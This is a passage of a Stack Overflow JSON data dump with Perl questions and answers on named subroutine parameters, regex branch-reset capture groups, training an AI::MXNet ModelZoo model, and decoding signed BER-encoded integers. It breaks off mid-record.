"profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 4, "last_activity_date": 1577223959, "last_edit_date": 1577223959, "creation_date": 1577139150, "answer_id": 59461789, "question_id": 59461659, "link": "https://stackoverflow.com/questions/59461659/a-function-with-too-many-parameters-in-perl/59461789#59461789", "title": "a function with too many parameters in perl", "body": "<p>There are many ways to solve this problem - as you know, if you want to do basic ordered parameters, perl's got that already.</p>\n\n<p>However, sometimes you want something a little neater - you can pass a hash instead. </p>\n\n<pre><code>use Data::Dumper; \n\nsub myspecial {\n\n  my %parameters = ( size =&gt; $default_size,\n                     toggle =&gt; 1, \n                     @_ ); \n\n  print Dumper \\%parameters;\n}\n</code></pre>\n\n<p>Then you can call the subroutine as parameters:</p>\n\n<pre><code>myspecial ( size =&gt; 42, cabbage =&gt; \"green\" ); \n</code></pre>\n\n<p>Because the 'size' parameter is defined within the sub, but <code>@_</code> is added to the end of the hash declaration, any size passed in will override the default. </p>\n\n<p>And in this way, you can give named parameters in any order. </p>\n\n<p>But there's always multiple ways to tackle this - sometimes you'll want to pass in a reference to a hash or object instead. </p>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1577171183, "last_edit_date": 1577171183, "creation_date": 1577141845, "answer_id": 59462100, "question_id": 59461659, "link": "https://stackoverflow.com/questions/59461659/a-function-with-too-many-parameters-in-perl/59462100#59462100", "title": "a function with too many parameters in perl", "body": "<p>you question is without any specifics -- too broad to answer in details.</p>\n\n<p>Probably something like following piece of code should cover your requiremensts</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature 'say';\n\nmy $debug = 0;\nmy %hash;\n\nmy @fields = qw( first last age speciality phone email address );\n\nwhile( &lt;DATA&gt; ) {\n    @hash{@fields} = split ':';\n    say Dumper(\\%hash) if $debug;\n    details(\\%hash);\n}\n\nsub details {\n    my $data = shift;\n\n    foreach my $field (@fields) {\n        printf \"%-15s : %s\\n\", $field, $data-&gt;{$field};\n    }\n}\n\n__DATA__\nJohn:Smith:35:Web Developer:(1) 641-723-3472:john.smith@inter.net:2241-2832 Moon crescent, 50003 Iova, US \nAlice:Gomer:28:Accountant:(1) 641-723-7391:alice.gomer@inter.net:2241-630 Jupiter drive, 50006 Iova, US \n</code></pre>\n\n<p>output</p>\n\n<pre><code>first           : John\nlast            : Smith\nage             : 35\nspeciality      : Web Developer\nphone           : (1) 641-723-3472\nemail           : john.smith@inter.net\naddress         : 2241-2832 Moon crescent, 50003 Iova, US\n\nfirst           : Alice\nlast            : Gomer\nage             : 28\nspeciality      : Accountant\nphone           : (1) 641-723-7391\nemail           : alice.gomer@inter.net\naddress         : 2241-630 Jupiter drive, 50006 Iova, US\n</code></pre>\n"}], "owner": {"reputation": 171, "user_id": 2799433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b011e057102e676020e526b0b82f1949?s=128&d=identicon&r=PG&f=1", "display_name": "user2799433", "link": "https://stackoverflow.com/users/2799433/user2799433"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "closed_date": 1577142789, "accepted_answer_id": 59461789, "answer_count": 2, "score": -3, "last_activity_date": 1577223959, "creation_date": 1577137969, "question_id": 59461659, "link": "https://stackoverflow.com/questions/59461659/a-function-with-too-many-parameters-in-perl", "closed_reason": "Needs details or clarity", "title": "a function with too many parameters in perl", "body": "<p>I have a function has too many parameters. I have viewed the resolving approach in PHP that passing class object into the function instead of many parameters. Is it any approaches for perl?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 0, "creation_date": 1577122829, "post_id": 59459263, "comment_id": 105099835, "body": "Change your regex to <code>&#47;a([^b]+)b&#47;g</code>: see code <a href=\"https://tio.run/##K0gtyjH9/1@lLLFIwVZBKc/QyDjRxNQsKdHcwjIp0dDA0NDQCEgbG5oYmiYpWXNpqOTpKDikF@WXFhRrAnVANNYp6CdqRMclxWprJumnW3MVFGXmlShk5WfmaajrqOsoIGuy/v8fAA\" rel=\"nofollow noreferrer\">here</a>"}, {"owner": {"reputation": 101, "user_id": 2787859, "user_type": "registered", "profile_image": "https://graph.facebook.com/100004041835408/picture?type=large", "display_name": "\u0e15\u0e49\u0e2d\u0e07 \u0e40\u0e2d\u0e01\u0e21\u0e31\u0e22", "link": "https://stackoverflow.com/users/2787859/%e0%b8%95%e0%b9%89%e0%b8%ad%e0%b8%87-%e0%b9%80%e0%b8%ad%e0%b8%81%e0%b8%a1%e0%b8%b1%e0%b8%a2"}, "reply_to_user": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 0, "creation_date": 1577123010, "post_id": 59459263, "comment_id": 105099897, "body": "I need n = 123 too."}, {"owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 0, "creation_date": 1577123050, "post_id": 59459263, "comment_id": 105099910, "body": "But that doesn&#39;t follow your rule of <code>a...b</code> - what&#39;s the rule for that field?"}, {"owner": {"reputation": 101, "user_id": 2787859, "user_type": "registered", "profile_image": "https://graph.facebook.com/100004041835408/picture?type=large", "display_name": "\u0e15\u0e49\u0e2d\u0e07 \u0e40\u0e2d\u0e01\u0e21\u0e31\u0e22", "link": "https://stackoverflow.com/users/2787859/%e0%b8%95%e0%b9%89%e0%b8%ad%e0%b8%87-%e0%b9%80%e0%b8%ad%e0%b8%81%e0%b8%a1%e0%b8%b1%e0%b8%a2"}, "reply_to_user": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 0, "creation_date": 1577123131, "post_id": 59459263, "comment_id": 105099937, "body": "n follow with some value until  a"}, {"owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 1, "creation_date": 1577123197, "post_id": 59459263, "comment_id": 105099969, "body": "Does <code>&#47;(?|n([^a]+)(?=a)|a([^b]+)b)&#47;g</code> work for you? See <a href=\"https://tio.run/##K0gtyjH9/1@lLLFIwVZBKc/QyDjRxNQsKdHcwjIp0dDA0NDQCEgbG5oYmiYpWXNpqOTpKDikF@WXFhRrAnVANNYp6GvY1@RpRMclxmpratjbJmrWJAJ5SUBekqZ@ujVXQVFmXolCVn5mnoa6jrqOArIx1v//AwA\" rel=\"nofollow noreferrer\">this</a>"}, {"owner": {"reputation": 101, "user_id": 2787859, "user_type": "registered", "profile_image": "https://graph.facebook.com/100004041835408/picture?type=large", "display_name": "\u0e15\u0e49\u0e2d\u0e07 \u0e40\u0e2d\u0e01\u0e21\u0e31\u0e22", "link": "https://stackoverflow.com/users/2787859/%e0%b8%95%e0%b9%89%e0%b8%ad%e0%b8%87-%e0%b9%80%e0%b8%ad%e0%b8%81%e0%b8%a1%e0%b8%b1%e0%b8%a2"}, "reply_to_user": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 0, "creation_date": 1577123495, "post_id": 59459263, "comment_id": 105100107, "body": "Thankz outstanding work well."}], "answers": [{"tags": [], "owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "is_accepted": true, "score": 1, "last_activity_date": 1577123877, "last_edit_date": 1577123877, "creation_date": 1577123571, "answer_id": 59459411, "question_id": 59459263, "link": "https://stackoverflow.com/questions/59459263/how-to-match-regex-single-combine-with-multi-groups-same-pattern-in-perl/59459411#59459411", "title": "How to match regex single combine with multi groups same pattern in Perl", "body": "<p>You can use the following regex:</p>\n\n<p><a href=\"https://regex101.com/r/k7Uqwx/1\" rel=\"nofollow noreferrer\">See regex in use here</a></p>\n\n<pre><code>/(?|n([^a]+)(?=a)|a([^b]+)b)/g\n</code></pre>\n\n<p>How it works:</p>\n\n<ul>\n<li><code>(?|...)</code> branch reset - any subpatterns in such a group share the same number (this makes the capture groups share the same index if alternations exist)</li>\n<li><code>n([^a]+)(?=a)|a([^b]+)b</code> match either of the following options:\n\n<ul>\n<li><code>n([^a]+)(?=a)</code>\n\n<ul>\n<li><code>n</code> matches <code>n</code> literally</li>\n<li><code>([^a]+)</code> captures any character except <code>a</code> one or more times into a capture group</li>\n<li><code>(?=a)</code> ensures the character <code>a</code> follows (positive lookahead) without consuming the character</li>\n</ul></li>\n<li><code>a([^b]+)b</code>\n\n<ul>\n<li><code>a</code> matches <code>a</code> literally</li>\n<li><code>([^b]+)</code> captures any character except <code>b</code> one or more times into a capture group</li>\n<li><code>b</code> matches <code>b</code> literally</li>\n</ul></li>\n</ul></li>\n</ul>\n\n<hr>\n\n<p><a href=\"https://tio.run/##K0gtyjH9/1@lLLFIwVZBKc/QyDjRxNQsKdHcwjIp0dDA0NDQCEgbG5oYmiYpWXNpqOTpKDikF@WXFhRrAnVANNYp6GvY1@RpRMclxmpratjbJmrWJAJ5SUBekqZ@ujVXQVFmXolCVn5mnoa6jrqOArIx1v//AwA\" rel=\"nofollow noreferrer\">See code in use here</a></p>\n\n<pre><code>$var = \"n123a456ba789ba101112ba131415b\";\n($n, @groups) = $var =~ /(?|n([^a]+)(?=a)|a([^b]+)b)/g;\nprint join(',', $n, @groups);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 0, "last_activity_date": 1577125005, "last_edit_date": 1577125005, "creation_date": 1577124636, "answer_id": 59459600, "question_id": 59459263, "link": "https://stackoverflow.com/questions/59459263/how-to-match-regex-single-combine-with-multi-groups-same-pattern-in-perl/59459600#59459600", "title": "How to match regex single combine with multi groups same pattern in Perl", "body": "<p>Please verify if the following code is comply with your requirements</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature 'say';\n\nuse Data::Dumper;\n\nmy %hash;\n\nwhile( &lt;DATA&gt; ) {\n    if( /^n(\\d+)/ ) {\n        my $n = $1;\n        my @data = /a(\\d+?)b/g;\n        $hash{$n} = \\@data;\n    } \n}\n\nsay Dumper(\\%hash);\n\n__DATA__\nn123a456ba789ba101112ba131415b\nn124a12345ba78910ba101113b\nn125a1234ba7891ba101114ba131415ba16171819b\n</code></pre>\n\n<p>output</p>\n\n<pre><code>$VAR1 = {\n          '123' =&gt; [\n                     '456',\n                     '789',\n                     '101112',\n                     '131415'\n                   ],\n          '125' =&gt; [\n                     '1234',\n                     '7891',\n                     '101114',\n                     '131415',\n                     '16171819'\n                   ],\n          '124' =&gt; [\n                     '12345',\n                     '78910',\n                     '101113'\n                   ]\n        };\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 0, "creation_date": 1577140446, "post_id": 59461667, "comment_id": 105104837, "body": "Well, then why not <b>my @vals =  /(\\d+)/g;</b>?"}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 0, "creation_date": 1577142340, "post_id": 59461667, "comment_id": 105105268, "body": "You have stated <b>fairly consistent</b> -- for me it means that between <b>a</b> and <b>b</b> consistently will be digits."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user12097764"}, "is_accepted": false, "score": 1, "last_activity_date": 1578277719, "last_edit_date": 1578277719, "creation_date": 1577138031, "answer_id": 59461667, "question_id": 59459263, "link": "https://stackoverflow.com/questions/59459263/how-to-match-regex-single-combine-with-multi-groups-same-pattern-in-perl/59461667#59461667", "title": "How to match regex single combine with multi groups same pattern in Perl", "body": "<p>The target sample line seems fairly consistent.<br>\nThis is a quick way to get it all in a single array, or the capture can be portioned via  <code>my ($n, @vals)</code> if needed.   </p>\n\n<pre><code>$_ = \"n123a456ba789ba101112ba131415b\";\nmy @vals = /[na]([^ab]*)/g;\nprint join(',', @vals)\n</code></pre>\n\n<p>output  </p>\n\n<pre><code>123,456,789,101112,131415\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "is_accepted": false, "score": 0, "last_activity_date": 1577182030, "creation_date": 1577182030, "answer_id": 59467105, "question_id": 59459263, "link": "https://stackoverflow.com/questions/59459263/how-to-match-regex-single-combine-with-multi-groups-same-pattern-in-perl/59467105#59467105", "title": "How to match regex single combine with multi groups same pattern in Perl", "body": "<p>Another way is to use <a href=\"https://perldoc.perl.org/5.30.0//functions/split.html\" rel=\"nofollow noreferrer\"><code>split</code></a>:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Dump qw(dump);\n\nwhile(&lt;DATA&gt;) {\n    chomp;\n    my @l = split /[nab]+/, $_;\n    shift @l;\n    dump@l;\n}\n\n__DATA__\nn123a456ba789ba101112ba131415b\nn124a12345ba78910ba101113b\nn125a1234ba7891ba101114ba131415ba16171819b\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>(123, 456, 789, 101112, 131415)\n(124, 12345, 78910, 101113)\n(125, 1234, 7891, 101114, 131415, 16171819)\n</code></pre>\n"}], "owner": {"reputation": 101, "user_id": 2787859, "user_type": "registered", "profile_image": "https://graph.facebook.com/100004041835408/picture?type=large", "display_name": "\u0e15\u0e49\u0e2d\u0e07 \u0e40\u0e2d\u0e01\u0e21\u0e31\u0e22", "link": "https://stackoverflow.com/users/2787859/%e0%b8%95%e0%b9%89%e0%b8%ad%e0%b8%87-%e0%b9%80%e0%b8%ad%e0%b8%81%e0%b8%a1%e0%b8%b1%e0%b8%a2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 1, "accepted_answer_id": 59459411, "answer_count": 4, "score": 1, "last_activity_date": 1578277719, "creation_date": 1577122627, "last_edit_date": 1577124551, "question_id": 59459263, "link": "https://stackoverflow.com/questions/59459263/how-to-match-regex-single-combine-with-multi-groups-same-pattern-in-perl", "title": "How to match regex single combine with multi groups same pattern in Perl", "body": "<p>I have data in the following format:</p>\n\n<pre><code>n123a456ba789ba101112ba131415b\nn124a12345ba78910ba101113b\nn125a1234ba7891ba101114ba131415ba16171819b\n</code></pre>\n\n<p>n following with some data until a.</p>\n\n<p>a is start field.</p>\n\n<p>b is end field.</p>\n\n<p>It has multiple fields a...b </p>\n\n<p>I want to capture n data and data between a...b into array.\nI tried with the following code but didn't work.</p>\n\n<pre><code>$var = \"n123a456ba789ba101112ba131415b\";\n\n($n, @groups) = $var =~ /n(.+?)(?:a(.+?)b)+/;\n\nprint join(',', $n, @groups);\n</code></pre>\n"}, {"tags": ["perl", "mxnet"], "answers": [{"comments": [{"owner": {"reputation": 846, "user_id": 385390, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b41a2fc080cdea0887394c53f4108dfb?s=128&d=identicon&r=PG", "display_name": "bliako", "link": "https://stackoverflow.com/users/385390/bliako"}, "edited": false, "score": 0, "creation_date": 1581340627, "post_id": 60143084, "comment_id": 106388303, "body": "Hito Yume thanks! I need to use my custom data which are images of alphabet letters. I am flexible about model or if Gluon or not. I do not know how to use the 1st example you cited with my dataiter and I do not know how to use the 2nd example with some ready-made solution of optical character recognition. Do you have any more information about how to use a dataiter with a Gluon from ModelZoo? Do you have any information about exporting and importing parameters? In <code>export()</code> method it says to move forwartd once? How do you do that? Summary: I need lots of examples please if you have any."}, {"owner": {"reputation": 21, "user_id": 12749786, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-TBNA-DB2Bh8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcMgIfO6QZaRYaxdys0cWaSeVwVJw/photo.jpg?sz=128", "display_name": "Hito Yume", "link": "https://stackoverflow.com/users/12749786/hito-yume"}, "reply_to_user": {"reputation": 846, "user_id": 385390, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b41a2fc080cdea0887394c53f4108dfb?s=128&d=identicon&r=PG", "display_name": "bliako", "link": "https://stackoverflow.com/users/385390/bliako"}, "edited": false, "score": 0, "creation_date": 1581378756, "post_id": 60143084, "comment_id": 106405544, "body": "The gluon example I posted will work as is I think with any iterator, because all of them have the same interface. The forward operation is simply calling gluon block as a subroutine with NDArray (converted image) as $vgg-&gt;($image_nd_array); . See dog breed classification example on this page <a href=\"http://blogs.perl.org/users/sergey_kolychev/2018/07/machine-learning-in-perl-kyuubi-goes-to-a-modelzoo-during-the-starry-night.html\" rel=\"nofollow noreferrer\">blogs.perl.org/users/sergey_kolychev/2018/07/&hellip;</a>"}, {"owner": {"reputation": 846, "user_id": 385390, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b41a2fc080cdea0887394c53f4108dfb?s=128&d=identicon&r=PG", "display_name": "bliako", "link": "https://stackoverflow.com/users/385390/bliako"}, "edited": false, "score": 0, "creation_date": 1581416881, "post_id": 60143084, "comment_id": 106417380, "body": "If you are willing to post some code with custom training data, perhaps similarly to the code I posted, it would be much helpful. I have read and tried the links you posted many times, they are tied to some use-cases which are not what I have. I tried to adapt to my use-case but ... So post some skeletal code if you can please."}, {"owner": {"reputation": 846, "user_id": 385390, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b41a2fc080cdea0887394c53f4108dfb?s=128&d=identicon&r=PG", "display_name": "bliako", "link": "https://stackoverflow.com/users/385390/bliako"}, "edited": false, "score": 0, "creation_date": 1581965803, "post_id": 60143084, "comment_id": 106606032, "body": "thank you @Hito Yume. I did not mean that you must get my code working but I would appreciate it if you already have some code working and you can share it with me. Please don&#39;t spend any time on this unless you already have some personal examples you want to share. I am sorry if I sounded a bit pressing. It&#39;s just that I tried already the links. So, thank you for your input, if you have already some working code then please share, otherwise don&#39;t spend more time on it if you have something better to do... thanks Hito Yume"}], "tags": [], "owner": {"reputation": 21, "user_id": 12749786, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-TBNA-DB2Bh8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcMgIfO6QZaRYaxdys0cWaSeVwVJw/photo.jpg?sz=128", "display_name": "Hito Yume", "link": "https://stackoverflow.com/users/12749786/hito-yume"}, "is_accepted": false, "score": 2, "last_activity_date": 1581298967, "creation_date": 1581298967, "answer_id": 60143084, "question_id": 59458361, "link": "https://stackoverflow.com/questions/59458361/aimxnet-perl-api-how-to-fit-a-zoo-model/60143084#60143084", "title": "AI::MXNet (Perl API) : how to fit() a zoo model", "body": "<p>It's not the right wait to train. The ModelZoo returns a Gluon Hybrid block.\nThe 'fit' is used in Module interface.\nSee how you can train with the Gluon:</p>\n\n<p><a href=\"https://metacpan.org/source/SKOLYCHEV/AI-MXNet-1.4/examples/gluon/mnist.pl\" rel=\"nofollow noreferrer\">https://metacpan.org/source/SKOLYCHEV/AI-MXNet-1.4/examples/gluon/mnist.pl</a></p>\n\n<p>The same with Module:\n<a href=\"https://metacpan.org/source/SKOLYCHEV/AI-MXNet-1.4/examples/mnist.pl\" rel=\"nofollow noreferrer\">https://metacpan.org/source/SKOLYCHEV/AI-MXNet-1.4/examples/mnist.pl</a></p>\n\n<p>You can call ->export method of hybrid block like $vgg->export();\n<a href=\"https://metacpan.org/source/SKOLYCHEV/AI-MXNet-1.4/lib/AI/MXNet/Gluon/Block.pm#L1242\" rel=\"nofollow noreferrer\">https://metacpan.org/source/SKOLYCHEV/AI-MXNet-1.4/lib/AI/MXNet/Gluon/Block.pm#L1242</a></p>\n\n<p>This will save json structure of the network and current parameters into a file.\nThen you can initialize the Module interface from these.</p>\n"}], "owner": {"reputation": 846, "user_id": 385390, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b41a2fc080cdea0887394c53f4108dfb?s=128&d=identicon&r=PG", "display_name": "bliako", "link": "https://stackoverflow.com/users/385390/bliako"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "answer_count": 1, "score": 4, "last_activity_date": 1581298967, "creation_date": 1577117917, "question_id": 59458361, "link": "https://stackoverflow.com/questions/59458361/aimxnet-perl-api-how-to-fit-a-zoo-model", "title": "AI::MXNet (Perl API) : how to fit() a zoo model", "body": "<p>I am trying to use the Perl API of MXNet (AI::MXNet) to fetch a standard model from ModelZoo (AI::MXNet::Gluon::ModelZoo::Vision) and train it.</p>\n\n<p>The following code does not complain but it does not fit(). fit() just returns immediately. My dataset is a file of images in the RecordIO format (constructed using im2rec) and I am quite sure it is valid.</p>\n\n<p>I have modified code from here <a href=\"https://codehex.hateblo.jp/entry/2017/09/12/160149\" rel=\"nofollow noreferrer\">https://codehex.hateblo.jp/entry/2017/09/12/160149</a>  , where the original author creates the model symbolically (and not from ModelZoo).</p>\n\n<p>Is this, in principle, the right way to train a model from ModelZoo?</p>\n\n<p>A second question is what's best practice for creating a data loader from a set of images. Is what I am doing (using <code>mx-&gt;io-&gt;ImageRecordIter</code>) OK?</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse AI::MXNet qw/mx/;\n\nuse AI::MXNet::Gluon qw/gluon/; # needed for nn-&gt; (which must be replaced by gluon-&gt;nn-&gt;...)\nuse AI::MXNet::Gluon::NN qw(nn); # for nn-&gt;\nuse AI::MXNet::Gluon::ModelZoo::Vision::VGG;\nuse AI::MXNet::Monitor;\n\nmy $ctx = mx-&gt;cpu(0);\n\nmy $vgg = AI::MXNet::Gluon::ModelZoo::Vision-&gt;get_vgg(\n    11, # num layers\n    (\n        'classes' =&gt; 26, # latin alphabet recognition\n        'root' =&gt; 'abc', # where to save the models\n        'ctx' =&gt; $ctx # context\n    )\n);\ndie \"get the model\" unless defined $vgg;\n\nmy $batch_size = 4;\n# num channels, width, height our png training images of letters:\nmy $img_shape = [3, 256, 256];\nmy $training_file = 'training.bin';\nmy $train_dataiter = mx-&gt;io-&gt;ImageRecordIter({\n    'path_imgrec' =&gt; $training_file,\n    'path_imglist' =&gt; 'training.lst',\n    # num channels, width, height\n    'data_shape' =&gt; $img_shape,\n    'batch_size' =&gt; $batch_size,\n    'label_width' =&gt; 1, # dimensionality of labels, for us is 1 (i.e. just the letter name)\n});\ndie \"mx-&gt;io-&gt;ImageRecordIter()\" unless defined $train_dataiter;\n\n$vgg-&gt;init_params(initializer =&gt; mx-&gt;init-&gt;Xavier(magnitude =&gt; 2));\n$vgg-&gt;init_optimizer(optimizer =&gt; 'sgd', optimizer_params =&gt; {learning_rate =&gt; 0.1});\n$vgg-&gt;initialize();\n\nprint \"$0 : fitting ...\\n\";\n$vgg-&gt;fit(\n    $train_dataiter,\n    'num_epoch' =&gt; 1000\n);\n</code></pre>\n"}, {"tags": ["perl", "integer", "hex"], "comments": [{"owner": {"reputation": 101, "user_id": 2787859, "user_type": "registered", "profile_image": "https://graph.facebook.com/100004041835408/picture?type=large", "display_name": "\u0e15\u0e49\u0e2d\u0e07 \u0e40\u0e2d\u0e01\u0e21\u0e31\u0e22", "link": "https://stackoverflow.com/users/2787859/%e0%b8%95%e0%b9%89%e0%b8%ad%e0%b8%87-%e0%b9%80%e0%b8%ad%e0%b8%81%e0%b8%a1%e0%b8%b1%e0%b8%a2"}, "edited": false, "score": 0, "creation_date": 1577106327, "post_id": 59455754, "comment_id": 105092841, "body": "It looks like 2174360105 - 2^32 = -2120607191"}, {"owner": {"reputation": 101, "user_id": 2787859, "user_type": "registered", "profile_image": "https://graph.facebook.com/100004041835408/picture?type=large", "display_name": "\u0e15\u0e49\u0e2d\u0e07 \u0e40\u0e2d\u0e01\u0e21\u0e31\u0e22", "link": "https://stackoverflow.com/users/2787859/%e0%b8%95%e0%b9%89%e0%b8%ad%e0%b8%87-%e0%b9%80%e0%b8%ad%e0%b8%81%e0%b8%a1%e0%b8%b1%e0%b8%a2"}, "edited": false, "score": 0, "creation_date": 1577106641, "post_id": 59455754, "comment_id": 105092972, "body": "Add another example: A1 E1 CE FD 0F = -5001055  I don&#39;t know how to check that it&#39;s negative value."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1577109125, "post_id": 59455754, "comment_id": 105094057, "body": "Re &quot;<i>I don&#39;t know how to check that it&#39;s negative value.</i>&quot;, There is no way to tell from the data you showed."}, {"owner": {"reputation": 1110, "user_id": 9749458, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/001ed2d47a01593ee5c6463c2f5fe224?s=128&d=identicon&r=PG&f=1", "display_name": "Dave Mitchell", "link": "https://stackoverflow.com/users/9749458/dave-mitchell"}, "edited": false, "score": 0, "creation_date": 1577116783, "post_id": 59455754, "comment_id": 105097378, "body": "By the way, your decodeInt() function modifies its argument, which is usually considered a bad thing to do. It also seems unnecesssary. You could just do a match m// rather than a substitution s///."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 1110, "user_id": 9749458, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/001ed2d47a01593ee5c6463c2f5fe224?s=128&d=identicon&r=PG&f=1", "display_name": "Dave Mitchell", "link": "https://stackoverflow.com/users/9749458/dave-mitchell"}, "edited": false, "score": 0, "creation_date": 1577149795, "post_id": 59455754, "comment_id": 105106390, "body": "@Dave Mitchell, I believe it could make sense here. There are BER-encoded numbers, which is a variable-length encoding for streams. It thus makes sense for a decoder/extractor to remove the encoded number from the input so that extraction can continue from where the encoded number left off."}], "answers": [{"comments": [{"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 1, "creation_date": 1577179485, "post_id": 59456105, "comment_id": 105112780, "body": "I believe <b>$num -= (1&lt;&lt;32);</b> will be more compute efficient."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 1, "creation_date": 1577199634, "post_id": 59456105, "comment_id": 105119678, "body": "@Polar Bear, I used exponentiation rather than shifting so it would work on 32-bit builds. Ignoring that, we&#39;re talking about one-time evaluation at compile-time, so the difference doesn&#39;t matter. Even if it didn&#39;t happen at compile-time, the difference is relatively tiny compared to the overhead. I did switch to <code>=-</code>, though."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 3, "last_activity_date": 1577193096, "last_edit_date": 